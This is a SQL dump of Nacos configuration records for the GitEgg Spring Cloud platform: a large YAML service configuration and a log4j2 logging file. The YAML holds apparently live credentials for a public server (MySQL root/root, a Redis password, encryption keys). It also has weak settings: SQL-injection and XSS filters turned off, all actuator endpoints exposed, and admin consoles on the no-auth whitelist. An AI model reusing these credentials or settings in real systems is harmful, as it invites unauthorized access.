      # 设置默认的数据源或者数据源组,默认值即为master
      primary: master
      # 设置严格模式,默认false不启动. 启动后在未匹配到指定数据源时候会抛出异常,不启动则使用默认数据源.
      strict: false
      # 开启seata代理，开启后默认每个数据源都代理，如果某个不需要代理可单独关闭
      seata: false
      #支持XA及AT模式,默认AT
      seata-mode: AT
      druid:
        initialSize: 1
        minIdle: 3
        maxActive: 20
        # 配置获取连接等待超时的时间
        maxWait: 60000
        # 配置间隔多久才进行一次检测，检测需要关闭的空闲连接，单位是毫秒
        timeBetweenEvictionRunsMillis: 60000
        # 配置一个连接在池中最小生存的时间，单位是毫秒
        minEvictableIdleTimeMillis: 30000
        validationQuery: select \'x\'
        testWhileIdle: true
        testOnBorrow: false
        testOnReturn: false
        # 打开PSCache，并且指定每个连接上PSCache的大小
        poolPreparedStatements: true
        maxPoolPreparedStatementPerConnectionSize: 20
        # 配置监控统计拦截的filters，去掉后监控界面sql无法统计，\'wall\'用于防火墙
        filters: config,stat,slf4j
        # 通过connectProperties属性来打开mergeSql功能；慢SQL记录
        connectionProperties: druid.stat.mergeSql=true;druid.stat.slowSqlMillis=5000;
        # 合并多个DruidDataSource的监控数据
        useGlobalDataSourceStat: true
      datasource: 
        master: 
          url: jdbc:mysql://39.98.125.88/gitegg_cloud?zeroDateTimeBehavior=convertToNull&useUnicode=true&characterEncoding=utf8&allowMultiQueries=true&serverTimezone=Asia/Shanghai
          username: root
          password: root
        workflow: 
          url: jdbc:mysql://39.98.125.88/workflow?&nullCatalogMeansCurrent=true&zeroDateTimeBehavior=convertToNull&useUnicode=true&characterEncoding=utf8&allowMultiQueries=true&serverTimezone=Asia/Shanghai
          username: root
          password: root
  cloud:
    nacos:
      discovery:
        metadata:
          # 启用SpringBootAdmin时 客户端端点信息的安全认证信息
          user.name: user
          user.password: password
    sentinel:
      filter:
        enabled: true
      transport:
        port: 8719
        dashboard: 39.98.125.88:8086
      eager: true
      datasource:
        ds2:
          nacos:
            data-type: json
            server-addr: 39.98.125.88:8848
            dataId: ${spring.application.name}-sentinel
            groupId: DEFAULT_GROUP
            rule-type: flow
    gateway:
      discovery:
        locator:
          enabled: true
      routes:
        - id: gitegg-oauth
          uri: lb://gitegg-oauth
          predicates:
            - Path=/gitegg-oauth/**
          filters:
            - StripPrefix=1
        - id: gitegg-service-system
          uri: lb://gitegg-service-system
          predicates:
            - Path=/gitegg-service-system/**
          filters:
            - StripPrefix=1
        - id: gitegg-service-extension
          uri: lb://gitegg-service-extension
          predicates:
            - Path=/gitegg-service-extension/**
          filters:
            - StripPrefix=1
        - id: gitegg-service-base
          uri: lb://gitegg-service-base
          predicates:
            - Path=/gitegg-service-base/**
          filters:
            - StripPrefix=1
        - id: gitegg-code-generator
          uri: lb://gitegg-code-generator
          predicates:
            - Path=/gitegg-code-generator/**
          filters:
            - StripPrefix=1
        - id: gitegg-admin-monitor
          uri: lb://gitegg-admin-monitor
          predicates:
            - Path=/gitegg-admin-monitor/**
          filters:
            - StripPrefix=1
        - id: monitor
          uri: lb://gitegg-admin-monitor
          predicates:
            - Path=/monitor/**
          filters:
            - StripPrefix=0
        - id: gitegg-job-admin
          uri: lb://gitegg-job-admin
          predicates:
            - Path=/gitegg-job-admin/**
          filters:
            - StripPrefix=1
        - id: xxl-job-admin
          uri: lb://gitegg-job-admin
          predicates:
            - Path=/xxl-job-admin/**
          filters:
            - StripPrefix=0
        - id: gitegg-plugin-workflow
          uri: lb://gitegg-plugin-workflow
          predicates:
            - Path=/gitegg-plugin-workflow/**
          filters:
            - StripPrefix=1
      # Gateway日志配置
      plugin: 
        config:
          # 是否开启Gateway日志插件
          enable: true
          # 请求日志记录插件
          logRequest:
            enable: true
            # requestLog==true && responseLog==false时，只记录请求参数日志；responseLog==true时，记录请求参数和返回参数。
            # 记录入参 requestLog==false时，不记录日志
            requestLog: true
            # 生产环境，尽量只记录入参，因为返回参数数据太大，且大多数情况是无意义的
            # 记录出参
            responseLog: true
            # all： 所有日志 configure:serviceId和pathList交集 serviceId： 只记录serviceId配置列表 pathList：只记录pathList配置列表
            logType: all
            serviceIdList:
            - "gitegg-oauth"
            - "gitegg-service-system"
            pathList:
            - "/gitegg-oauth/oauth/token"
            - "/gitegg-oauth/oauth/user/info"
          # SQL注入拦截插件，这里和上面不一样，是白名单配置，配置了链接的是不做sql注入拦截
          sqlInjection:
            enable: false
            serviceIdList:
            pathList:
          # XSS注入拦截插件，这里和上面不一样，是白名单配置，配置了链接的是不做sql注入拦截
          xssInjection:
            enable: false
            serviceIdList:
            pathList:
    # 消息中间件配置
    # stream:
    #   binders: 
    #     defaultRabbit: 
    #       type: rabbit
    #       environment: #配置rabbimq连接环境
    #         spring: 
    #           rabbitmq:
    #             host: 172.16.20.225
    #             username: admin
    #             password: 123456
    #             virtual-host: / 
    #     kafka:
    #       type: kafka
    #       environment:
    #         spring:
    #           cloud:
    #             stream:
    #               kafka:
    #                 binder:
    #                   brokers: 172.16.20.220:9092,172.16.20.221:9092,172.16.20.222:9092
    #                   zkNodes: 172.16.20.220:2181,172.16.20.221:2181,172.16.20.222:2181
    #                   # 自动创建Topic
    #                   auto-create-topics: true
    #   bindings: 
    #     output_operation_log:
    #       destination: operation-log  #exchange名称，交换模式默认是topic
    #       content-type: application/json
    #       binder: kafka
    #     output_api_log:
    #       destination: api-log  #exchange名称，交换模式默认是topic
    #       content-type: application/json
    #       binder: defaultRabbit
    #     input_operation_log: 
    #       destination: operation-log
    #       content-type: application/json
    #       binder: kafka
    #       group: ${spring.application.name}
    #       consumer:
    #         concurrency: 2 # 初始/最少/空闲时 消费者数量,默认1
    #     input_api_log: 
    #       destination: api-log
    #       content-type: application/json
    #       binder: defaultRabbit
    #       group: ${spring.application.name}
    #       consumer:
    #         concurrency: 2 # 初始/最少/空闲时 消费者数量,默认1
  redis:
    database: 1
    host: 39.98.125.88
    port: 6379
    password: wW257007
    ssl: false
    timeout: 2000
    lettuce:
      pool:
        # 连接池最大连接数（使用负值表示没有限制） 默认 8
        max-active: 8
        # 连接池最大阻塞等待时间（使用负值表示没有限制） 默认 -1
        max-wait: -1ms
        # 连接池中的最大空闲连接 默认 8
        max-idle: 8
        # 连接池中的最小空闲连接 默认 0
        min-idle: 0
  redisson: 
    config: |
      singleServerConfig:
        idleConnectionTimeout: 10000
        connectTimeout: 10000
        timeout: 3000
        retryAttempts: 3
        retryInterval: 1500
        password: 123456
        subscriptionsPerConnection: 5
        clientName: null
        address: "redis://39.98.125.88:6379"
        subscriptionConnectionMinimumIdleSize: 1
        subscriptionConnectionPoolSize: 50
        connectionMinimumIdleSize: 32
        connectionPoolSize: 64
        database: 0
        dnsMonitoringInterval: 5000
      threads: 0
      nettyThreads: 0
      codec: !<org.redisson.codec.JsonJacksonCodec> {}
      "transportMode":"NIO"
  thymeleaf:
    cache: false
  mail:
    tenant: true
    username: xxxxxx@qq.com
    password: xxxxxxxxx
    default-encoding: UTF-8
    host: smtp.mxhichina.com
    port: 25
    protocol: smtp
    properties:
      mail:
        smtp:
          auth: true
          ssl:
            enable: false
  # 异步发送邮件，核心线程池数配置
  mail-task:
    execution:
      pool:
        core-size: 5
        max-size: 10
        queue-capacity: 5
        keep-alive: 60
      thread-name-prefix: mail-send-task-
#业务系统相关初始化参数
system:
  #登录密码默认最大尝试次数
  maxTryTimes: 5
  #不需要验证码登录的最大次数
  maxNonCaptchaTimes: 2
  #密码错误锁定时间，单位：秒
  maxLockDuration: 7200
  #通用对称加密秘钥,生产环境请替换
  secret-key: YJyZJ28mMum6JA3Y
  #通用对称加密秘钥偏移,使用DES加密时，长度必须是8位，生产环境请替换
  secret-key-salt: YOIYvR2Q
  #注册用户默认密码
  defaultPwd: 12345678
  #如果使用默认密码，那么第一次登录强制修改密码
  defaultPwdChangeFirst: true
  #注册用户默认角色ID
  defaultRoleId: 2
  #注册用户默认组织机构ID
  defaultOrgId: 1
  #注册用户默认状态
  defaultUserStatus: 1
  #不需要数据权限过滤的角色key
  noDataFilterRole: DATA_NO_FILTER
  #第三方登录超时时间（秒）默认为3600秒
  socialLoginExpiration: 3600
  #第三方登录最大尝试次数，如果超过次数，那么需重新授权
  socialLoginTryTimes: 5
  #默认文件操作目录
  defaultDir: /tmp
  #OAuth2公钥和密码
  keyPair:
    keyLocation: gitegg.jks
    keyPassword: 123456
    alias: gitegg
xxl:
  job:
    admin:
      addresses: http://39.98.125.88/gitegg-job-admin
    accessToken: \'default_token\'
    executor:
      appname: ${spring.application.name}
      address:
      ip:
      port: 9999
      logpath: D:\\\\log4j2_nacos\\\\xxl-job\\\\jobhandler
      logretentiondays: 30
resubmit-lock:
  enabled: true
logging:
  config: http://${spring.cloud.nacos.discovery.server-addr}/nacos/v1/cs/configs?dataId=log4j2.xml&group=${spring.nacos.config.group}
  file:
    # 配置日志的路径，包含 spring.application.name  Linux:  /var/log/${spring.application.name}
    path: D:\\\\log4j2_nacos\\\\${spring.application.name}
feign:
  hystrix:
    enabled: false
  compression:
    # 配置响应 GZIP 压缩
    response: 
      enabled: true
    # 配置请求 GZIP 压缩
    request:
      enabled: true
      # 支持压缩的mime types
      mime-types: text/xml,application/xml,application/json
      # 配置压缩数据大小的最小阀值，默认 2048
      min-request-size: 2048
  client:
    config:
      default:
        connectTimeout: 8000
        readTimeout: 8000
        loggerLevel: FULL
#Ribbon配置
ribbon:
  #请求连接的超时时间
  ConnectTimeout: 50000
  #请求处理/响应的超时时间
  ReadTimeout: 50000
  #对所有操作请求都进行重试，如果没有实现幂等的情况下是很危险的,所以这里设置为false
  OkToRetryOnAllOperations: false
  #切换实例的重试次数
  MaxAutoRetriesNextServer: 5
  #当前实例的重试次数
  MaxAutoRetries: 5
  #负载均衡策略
  NFLoadBalancerRuleClassName: com.alibaba.cloud.nacos.ribbon.NacosRule
# 性能监控端点配置
management:
  security:
    enabled: true
    role: ACTUATOR_ADMIN
  endpoint:
    health:
      show-details: always
    metrics:
      enabled: true
  endpoints:
    enabled-by-default: true
    web:
      base-path: /actuator
      exposure:
        include: \'*\'
  metrics:
    tags:
      application: ${spring.application.name}
    export:
      prometheus:
        enabled: true
        step: 1ms
        descriptions: true
  server:
    servlet:
      context-path: /actuator
  health:
    mail:
      enabled: false
mybatis-plus:
  mapper-locations: classpath*:/com/gitegg/*/*/mapper/*Mapper.xml
  typeAliasesPackage: com.gitegg.*.*.entity
  global-config:
    #主键类型  0:"数据库ID自增", 1:"用户输入ID",2:"全局唯一ID (数字类型唯一ID)", 3:"全局唯一ID UUID";
    id-type: 2
    #字段策略 0:"忽略判断",1:"非 NULL 判断"),2:"非空判断"
    field-strategy: 2
    #驼峰下划线转换
    db-column-underline: true
    #刷新mapper 调试神器
    refresh-mapper: true
    #数据库大写下划线转换
    #capital-mode: true
    #逻辑删除配置
    logic-delete-value: 1
    logic-not-delete-value: 0
  configuration:
    map-underscore-to-camel-case: true
    cache-enabled: false
    log-impl: org.apache.ibatis.logging.stdout.StdOutImpl
# 多租户配置
tenant:
  # 是否开启租户模式
  enable: true
  # 需要排除的多租户的表
  exclusionTable:
    - "t_sys_district"
    - "t_sys_tenant"
    - "t_sys_role"
    - "t_sys_resource"
    - "t_sys_role_resource"
    - "oauth_client_details"
  # 租户字段名称
  column: tenant_id
# 数据权限
data-permission:
  # 注解方式默认关闭，否则影响性能
  annotation-enable: true
seata:
  enabled: false
  application-id: ${spring.application.name}
  tx-service-group: gitegg_seata_tx_group
  # 一定要是false
  enable-auto-data-source-proxy: false
  service:
    vgroup-mapping:
      #key与上面的gitegg_seata_tx_group的值对应
      gitegg_seata_tx_group: default
  config:
    type: nacos
    nacos:
      namespace:
      serverAddr: 39.98.125.88:8848
      group: SEATA_GROUP
      userName: "nacos"
      password: "nacos"
  registry:
    type: nacos
    nacos:
      #seata服务端(TC)在nacos中的应用名称
      application: seata-server
      server-addr: 39.98.125.88:8848
      namespace:
      userName: "nacos"
      password: "nacos"
#验证码配置
captcha:
  #验证码的类型 sliding: 滑动验证码 image: 图片验证码
  type: sliding
aj:
  captcha:
    #缓存local/redis...
    cache-type: redis
    #local缓存的阈值,达到这个值，清除缓存
    #cache-number=1000
    #local定时清除过期缓存(单位秒),设置为0代表不执行
    #timing-clear=180
    #验证码类型default两种都实例化。
    type: default
    #汉字统一使用Unicode,保证程序通过@value读取到是中文，在线转换 https://tool.chinaz.com/tools/unicode.aspx 中文转Unicode
    #右下角水印文字(我的水印)
    water-mark: GitEgg
    #右下角水印字体(宋体)
    water-font: 宋体
    #点选文字验证码的文字字体(宋体)
    font-type: 宋体
    #校验滑动拼图允许误差偏移量(默认5像素)
    slip-offset: 5
    #aes加密坐标开启或者禁用(true|false)
    aes-status: true
    #滑动干扰项(0/1/2) 1.2.2版本新增
    interference-options: 2
    # 接口请求次数一分钟限制是否开启 true|false
    req-frequency-limit-enable: true
    # 验证失败5次，get接口锁定
    req-get-lock-limit: 5
    # 验证失败后，锁定时间间隔,s
    req-get-lock-seconds: 360
    # get接口一分钟内请求数限制
    req-get-minute-limit: 30
    # check接口一分钟内请求数限制
    req-check-minute-limit: 60
    # verify接口一分钟内请求数限制
    req-verify-minute-limit: 60
#SMS短信通用配置
sms:
  #手机号码正则表达式，为空则不做验证
  reg:
  #负载均衡类型 可选值: Random、RoundRobin、WeightRandom、WeightRoundRobin
  load-balancer-type: Random
  web:
    #启用web端点
    enable: true
    #访问路径前缀
    base-path: /commons/sms
  verification-code:
    code-key: code
    #验证码长度
    code-length: 6
    #为true则验证失败后删除验证码
    delete-by-verify-fail: false
    #为true则验证成功后删除验证码
    delete-by-verify-succeed: true
    #重新发送验证码间隔时间，单位秒
    retry-interval-time: 60
    #验证码验证，前置验证重试次数
    retry-verification-times: 3
    #验证码有效期，单位秒
    expiration-time: 180
    #识别码长度
    identification-code-length: 3
    #是否启用识别码
    use-identification-code: false
  redis:
    #验证码业务在保存到redis时的key的前缀
    key-prefix: VerificationCode
#justauth第三方登录设置
justauth:
  enabled: true
  # Cloud项目不需要配置，默认即可，Boot项目需要选择，解决HttpUtil冲突问题。可选值：default、okhttp3、 apache、 hutool。选default时，走的是默认选择，首选java11的HttpClient。
  http-util: hutool
  # extend:
  #   enum-class: com.xkcoding.justauthspringbootstarterdemo.extend.ExtendSource
  #   config:
  #     TEST:
  #       request-class: com.xkcoding.justauthspringbootstarterdemo.extend.ExtendTestRequest
  #       client-id: xxxxxx
  #       client-secret: xxxxxxxx
  #       redirect-uri: http://oauth.xkcoding.com/demo/oauth/test/callback
  #     MYGITLAB:
  #       request-class: com.xkcoding.justauthspringbootstarterdemo.extend.ExtendMyGitlabRequest
  #       client-id: xxxxxx
  #       client-secret: xxxxxxxx
  #       redirect-uri: http://localhost:8443/oauth/mygitlab/callback
  type:
    WECHAT_OPEN:
      client-id: xxxxxxxxxxxxxxxx
      client-secret: xxxxxxxxxxxxxxxxx
      redirect-uri: http://39.98.125.88:5173/social/wechat_open/callback
      ignore-check-state: false
    WECHAT_MP:
      client-id: xxxxxxxxxxxxxxxx
      client-secret: xxxxxxxxxxxxxxxx
      redirect-uri: http://39.98.125.88:5173/social/wechat_mp/callback
      ignore-check-state: false
      # scopes:
      #   - profile
      #   - email
      #   - openid
  http-config:
    timeout: 30000
    # proxy:
    #   GOOGLE:
    #     type: HTTP
    #     hostname: 39.98.125.88
    #     port: 10080
    #   MYGITLAB:
    #     type: HTTP
    #     hostname: 39.98.125.88
    #     port: 10080
  cache:
    type: Redis
    prefix: \'GITEGG:JUSTAUTH:\'
    timeout: 1h
wx:
  miniapp:
    configs:
      - appid: xxxxxxxxx
        secret: xxxxxxxxxxxxxxx
        token: #微信小程序消息服务器配置的token
        aesKey: #微信小程序消息服务器配置的EncodingAESKey
        msgDataFormat: JSON
# 网关放行设置 1、whiteUrls不需要鉴权的公共url，白名单，配置白名单路径 2、authUrls需要鉴权的公共url
oauth-list:
  staticFiles:
    - "/doc.html"
    - "/webjars/**"
    - "/favicon.ico"
    - "/swagger-resources/**"
    - "/gitegg-oauth/assets/**"
    - "/gitegg-oauth/favicon.ico"
  whiteUrls:
    - "/*/v2/api-docs"
    - "/gitegg-oauth/login/phone"
    - "/gitegg-oauth/login/qr"
    - "/gitegg-oauth/oauth/sso/token"
    - "/gitegg-oauth/oauth/public_key"
    - "/gitegg-oauth/oauth/token_key"
    - "/gitegg-oauth/oauth/captcha/type"
    - "/gitegg-oauth/oauth/captcha"
    - "/gitegg-oauth/oauth/captcha/check"
    - "/gitegg-oauth/oauth/captcha/image"
    - "/gitegg-oauth/login"
    - "/gitegg-oauth/find/pwd"
    - "/gitegg-oauth/code/sms/login"
    - "/gitegg-oauth/change/password"
    - "/gitegg-oauth/error"
    - "/gitegg-oauth/oauth/sms/captcha/send"
    - "/gitegg-service-base/dict/list/{dictCode}"
    - "/gitegg-oauth/social/{type}/callback"
    - "/gitegg-oauth/social/login/{type}"
    - "/gitegg-oauth/social/bind/mobile"
    - "/gitegg-oauth/social/bind/account"
    - "/gitegg-service-extension/extension/sms/code/send"
    - "/gitegg-service-extension/extension/sms/check/code/pre"
    - "/gitegg-service-extension/extension/sms/check/code"
    - "/gitegg-service-extension/extension/wx/user/{appid}/login"
    - "/gitegg-service-extension/extension/wx/user/{appid}/info"
    - "/gitegg-service-extension/extension/wx/user/{appid}/phone"
    - "/gitegg-service-extension/extension/batch/get/file/url"
    - "/gitegg-service-system/account/register/sms/send"
    - "/gitegg-service-system/account/register"
    - "/gitegg-service-system/account/register/check"
    - "/gitegg-service-system/account/pwd/sms/send"
    - "/gitegg-service-system/account/pwd/update"
    - "/xxl-job-admin/**"
    - "/gitegg-plugin-workflow/**"
    - "/gitegg-admin-monitor/**"
  authUrls:
    - "/gitegg-oauth/oauth/logout"
    - "/gitegg-oauth/oauth/user/info"
    - "/gitegg-service-system/account/user/info"
    - "/gitegg-service-system/account/info/update"
    - "/gitegg-service-system/account/avatar/update"
    - "/gitegg-oauth/index"
    - "/gitegg-service-system/resource/user/menu"
    - "/gitegg-service-system/resource/user/resource"
    - "/gitegg-service-system/organization/tree"
    - "/gitegg-service-base/dict/list/{dictCode}"
    - "/gitegg-service-basebase/dict/batch/query"
    - "/gitegg-service-base/business/dict/list/{dictCode}"
    - "/gitegg-service-base/business/dict/batch/query"
    - "/gitegg-service-extension/extension/upload/file"
    - "/gitegg-service-extension/extension/dfs/query/default"
    - "/gitegg-service-extension/extension/wx/user/bind"
    - "/gitegg-service-extension/extension/wx/user/unbind"
  # OAuth2认证接口，此处网关放行，由认证中心进行认证
  tokenUrls:
    - "/gitegg-oauth/oauth/token"', 'e2d3a56b07d23a0727759eb2532ae383', '2024-08-07 10:36:56', '2024-08-07 11:14:30', 'nacos', '61.140.102.249', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', '', '', '', 'yaml', '');
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (164, 'log4j2.xml', 'GITEGG_CLOUD', '<?xml version="1.0" encoding="UTF-8"?>
<!--日志级别以及优先级排序: OFF > FATAL > ERROR > WARN > INFO > DEBUG > TRACE > ALL -->
<configuration monitorInterval="5" packages="org.apache.skywalking.apm.toolkit.log.log4j.v2.x">
    <!--变量配置-->
    <Properties>
        <!--         格式化输出：%date表示日期，traceId表示微服务Skywalking追踪id，%thread表示线程名，%-5level：级别从左显示5个字符宽度 %m：日志消息，%n是换行符-->
        <!--         %c 输出类详情 %M 输出方法名 %pid 输出pid  %line 日志在哪一行被打印 -->
        <!--         %logger{80} 表示 Logger 名字最长80个字符 -->
        <!--         value="${LOCAL_IP_HOSTNAME} %date [%p] %C [%thread] pid:%pid line:%line %throwable %c{10} %m%n"/>-->
        <property name="CONSOLE_LOG_PATTERN"
                  value="%d %highlight{%-5level [%traceId] pid:%pid-%line}{ERROR=Bright RED, WARN=Bright Yellow, INFO=Bright Green, DEBUG=Bright Cyan, TRACE=Bright White} %style{[%t]}{bright,magenta} %style{%c{1.}.%M(%L)}{cyan}: %msg%n"/>
        <property name="LOG_PATTERN"
                  value="%d %highlight{%-5level [%traceId] pid:%pid-%line}{ERROR=Bright RED, WARN=Bright Yellow, INFO=Bright Green, DEBUG=Bright Cyan, TRACE=Bright White} %style{[%t]}{bright,magenta} %style{%c{1.}.%M(%L)}{cyan}: %msg%n"/>
        <!-- 读取application.yaml文件中设置的日志路径 logging.file.path-->
        <Property name="FILE_PATH">${spring:logging.file.path}</Property>
        <!-- <property name="FILE_PATH">D:\\\\log4j2_cloud</property> -->
        <property name="applicationName">${spring:spring.application.name}</property>
        <property name="FILE_STORE_MAX" value="50MB"/>
        <property name="FILE_WRITE_INTERVAL" value="1"/>
        <property name="LOG_MAX_HISTORY" value="60"/>
    </Properties>

    <appenders>
        <!-- 控制台输出 -->
        <console name="Console" target="SYSTEM_OUT">
            <!-- 输出日志的格式 -->
            <PatternLayout pattern="${CONSOLE_LOG_PATTERN}"/>
            <!-- 控制台只输出level及其以上级别的信息（onMatch），其他的直接拒绝（onMismatch） -->
            <ThresholdFilter level="info" onMatch="ACCEPT" onMismatch="DENY"/>
        </console>

        <!-- 这个会打印出所有的info及以下级别的信息，每次大小超过size，则这size大小的日志会自动存入按年份-月份建立的文件夹下面并进行压缩，作为存档 -->
        <RollingRandomAccessFile name="RollingFileInfo" fileName="${FILE_PATH}/info.log"
                                 filePattern="${FILE_PATH}/INFO-%d{yyyy-MM-dd}_%i.log.gz">
            <!-- 控制台只输出level及以上级别的信息（onMatch），其他的直接拒绝（onMismatch）-->
            <ThresholdFilter level="info" onMatch="ACCEPT" onMismatch="DENY"/>
            <PatternLayout pattern="${LOG_PATTERN}"/>
            <Policies>
                <!--interval属性用来指定多久滚动一次，默认是1 hour-->
                <TimeBasedTriggeringPolicy interval="${FILE_WRITE_INTERVAL}"/>
                <SizeBasedTriggeringPolicy size="${FILE_STORE_MAX}"/>
            </Policies>
            <!-- DefaultRolloverStrategy属性如不设置，则默认为最多同一文件夹下7个文件开始覆盖-->
            <DefaultRolloverStrategy max="${LOG_MAX_HISTORY}"/>
        </RollingRandomAccessFile>

        <!-- 这个会打印出所有的debug及以下级别的信息，每次大小超过size，则这size大小的日志会自动存入按年份-月份建立的文件夹下面并进行压缩，作为存档-->
        <RollingRandomAccessFile name="RollingFileDebug" fileName="${FILE_PATH}/debug.log"
                                 filePattern="${FILE_PATH}/DEBUG-%d{yyyy-MM-dd}_%i.log.gz">
            <!--控制台只输出level及以上级别的信息（onMatch），其他的直接拒绝（onMismatch）-->
            <ThresholdFilter level="debug" onMatch="ACCEPT" onMismatch="DENY"/>
            <PatternLayout pattern="${LOG_PATTERN}"/>
            <Policies>
                <!--interval属性用来指定多久滚动一次，默认是1 hour-->
                <TimeBasedTriggeringPolicy interval="${FILE_WRITE_INTERVAL}"/>
                <SizeBasedTriggeringPolicy size="${FILE_STORE_MAX}"/>
            </Policies>
            <!-- DefaultRolloverStrategy属性如不设置，则默认为最多同一文件夹下7个文件开始覆盖-->
            <DefaultRolloverStrategy max="${LOG_MAX_HISTORY}"/>
        </RollingRandomAccessFile>

        <!-- 这个会打印出所有的warn及以上级别的信息，每次大小超过size，则这size大小的日志会自动存入按年份-月份建立的文件夹下面并进行压缩，作为存档-->
        <RollingRandomAccessFile name="RollingFileWarn" fileName="${FILE_PATH}/warn.log"
                                 filePattern="${FILE_PATH}/WARN-%d{yyyy-MM-dd}_%i.log.gz">
            <!-- 控制台只输出level及以上级别的信息（onMatch），其他的直接拒绝（onMismatch）-->
            <ThresholdFilter level="warn" onMatch="ACCEPT" onMismatch="DENY"/>
            <PatternLayout pattern="${LOG_PATTERN}"/>
            <Policies>
                <!-- interval属性用来指定多久滚动一次，默认是1 hour -->
                <TimeBasedTriggeringPolicy interval="${FILE_WRITE_INTERVAL}"/>
                <SizeBasedTriggeringPolicy size="${FILE_STORE_MAX}"/>
            </Policies>
            <!-- DefaultRolloverStrategy属性如不设置，则默认为最多同一文件夹下7个文件开始覆盖 -->
            <DefaultRolloverStrategy max="${LOG_MAX_HISTORY}"/>
        </RollingRandomAccessFile>

        <!-- 这个会打印出所有的error及以上级别的信息，每次大小超过size，则这size大小的日志会自动存入按年份-月份建立的文件夹下面并进行压缩，作为存档 -->
        <RollingRandomAccessFile name="RollingFileError" fileName="${FILE_PATH}/error.log"
                                 filePattern="${FILE_PATH}/ERROR-%d{yyyy-MM-dd}_%i.log.gz">
            <!--只输出level及以上级别的信息（onMatch），其他的直接拒绝（onMismatch）-->
            <ThresholdFilter level="error" onMatch="ACCEPT" onMismatch="DENY"/>
            <PatternLayout pattern="${LOG_PATTERN}"/>
            <Policies>
                <!--interval属性用来指定多久滚动一次，默认是1 hour-->
                <TimeBasedTriggeringPolicy interval="${FILE_WRITE_INTERVAL}"/>
                <SizeBasedTriggeringPolicy size="${FILE_STORE_MAX}"/>
            </Policies>
            <!-- DefaultRolloverStrategy属性如不设置，则默认为最多同一文件夹下7个文件开始覆盖-->
            <DefaultRolloverStrategy max="${LOG_MAX_HISTORY}"/>
        </RollingRandomAccessFile>

                <!-- 这个会打印出所有的operation级别的信息，每次大小超过size，则这size大小的日志会自动存入按年份-月份建立的文件夹下面并进行压缩，作为存档 -->
        <RollingRandomAccessFile name="RollingFileOperation" fileName="${FILE_PATH}/operation.log"
                                 filePattern="${FILE_PATH}/OPERATION-%d{yyyy-MM-dd}_%i.log.gz">
            <!--只输出action level级别的信息（onMatch），其他的直接拒绝（onMismatch）-->
            <LevelRangeFilter minLevel="OPERATION" maxLevel="OPERATION" onMatch="ACCEPT" onMismatch="DENY"/>
            <PatternLayout pattern="${LOG_PATTERN}"/>
            <Policies>
                <!--interval属性用来指定多久滚动一次，默认是1 hour-->
                <TimeBasedTriggeringPolicy interval="${FILE_WRITE_INTERVAL}"/>
                <SizeBasedTriggeringPolicy size="${FILE_STORE_MAX}"/>
            </Policies>
            <!-- DefaultRolloverStrategy属性如不设置，则默认为最多同一文件夹下7个文件开始覆盖-->
            <DefaultRolloverStrategy max="${LOG_MAX_HISTORY}"/>
        </RollingRandomAccessFile>

        <!-- 这个会打印出所有的api级别的信息，每次大小超过size，则这size大小的日志会自动存入按年份-月份建立的文件夹下面并进行压缩，作为存档 -->
        <RollingRandomAccessFile name="RollingFileApi" fileName="${FILE_PATH}/api.log"
                                 filePattern="${FILE_PATH}/API-%d{yyyy-MM-dd}_%i.log.gz">
            <!--只输出visit level级别的信息（onMatch），其他的直接拒绝（onMismatch）-->
            <LevelRangeFilter minLevel="API" maxLevel="API" onMatch="ACCEPT" onMismatch="DENY"/>
            <PatternLayout pattern="${LOG_PATTERN}"/>
            <Policies>
                <!--interval属性用来指定多久滚动一次，默认是1 hour-->
                <TimeBasedTriggeringPolicy interval="${FILE_WRITE_INTERVAL}"/>
                <SizeBasedTriggeringPolicy size="${FILE_STORE_MAX}"/>
            </Policies>
            <!-- DefaultRolloverStrategy属性如不设置，则默认为最多同一文件夹下7个文件开始覆盖-->
            <DefaultRolloverStrategy max="${LOG_MAX_HISTORY}"/>
        </RollingRandomAccessFile>

        <!-- <Kafka name="KafkaOperationLog" topic="operation_log" ignoreExceptions="false">
            <LevelRangeFilter minLevel="OPERATION" maxLevel="OPERATION" onMatch="ACCEPT" onMismatch="DENY"/>
            <PatternLayout pattern="${LOG_PATTERN}"/>
            <Property name="bootstrap.servers">172.16.20.220:9092,172.16.20.221:9092,172.16.20.222:9092</Property>
            <Property name="max.block.ms">2000</Property>
        </Kafka>

        <Kafka name="KafkaApiLog" topic="api_log" ignoreExceptions="false">
            <LevelRangeFilter minLevel="API" maxLevel="API" onMatch="ACCEPT" onMismatch="DENY"/>
            <PatternLayout pattern="${LOG_PATTERN}"/>
            <Property name="bootstrap.servers">172.16.20.220:9092,172.16.20.221:9092,172.16.20.222:9092</Property>
            <Property name="max.block.ms">2000</Property>
        </Kafka> -->

    </appenders>

    <!-- Logger节点用来单独指定日志的形式，比如要为指定包下的class指定不同的日志级别等 -->
    <!-- 然后定义loggers，只有定义了logger并引入的appender，appender才会生效 -->
    <loggers>

        <!--过滤掉spring和mybatis的一些无用的DEBUG信息-->
        <logger name="org.mybatis" level="info" additivity="false">
            <AppenderRef ref="Console"/>
        </logger>

        <!--若是additivity设为false，则子Logger 只会在自己的appender里输出，而不会在父Logger 的appender里输出 -->
        <Logger name="org.springframework" level="info" additivity="false">
            <AppenderRef ref="Console"/>
        </Logger>

        <!-- 避免递归记录日志 -->
        <Logger name="org.apache.kafka" level="INFO" />

        <AsyncLogger name="AsyncLogger" level="debug" additivity="false">
            <AppenderRef ref="Console"/>
            <AppenderRef ref="RollingFileDebug"/>
            <AppenderRef ref="RollingFileInfo"/>
            <AppenderRef ref="RollingFileWarn"/>
            <AppenderRef ref="RollingFileError"/>
            <AppenderRef ref="RollingFileOperation"/>
            <AppenderRef ref="RollingFileApi"/>
            <!-- <AppenderRef ref="KafkaOperationLog"/>
            <AppenderRef ref="KafkaApiLog"/> -->
        </AsyncLogger>

        <root level="trace">
            <appender-ref ref="Console"/>
            <appender-ref ref="RollingFileDebug"/>
            <appender-ref ref="RollingFileInfo"/>
            <appender-ref ref="RollingFileWarn"/>
            <appender-ref ref="RollingFileError"/>
            <AppenderRef ref="RollingFileOperation"/>
            <AppenderRef ref="RollingFileApi"/>
            <!-- <AppenderRef ref="KafkaOperationLog"/>
            <AppenderRef ref="KafkaApiLog"/> -->
        </root>
    </loggers>

</configuration>', '414fa4f0b7342b44c6c2d164624ce1aa', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'xml', null);
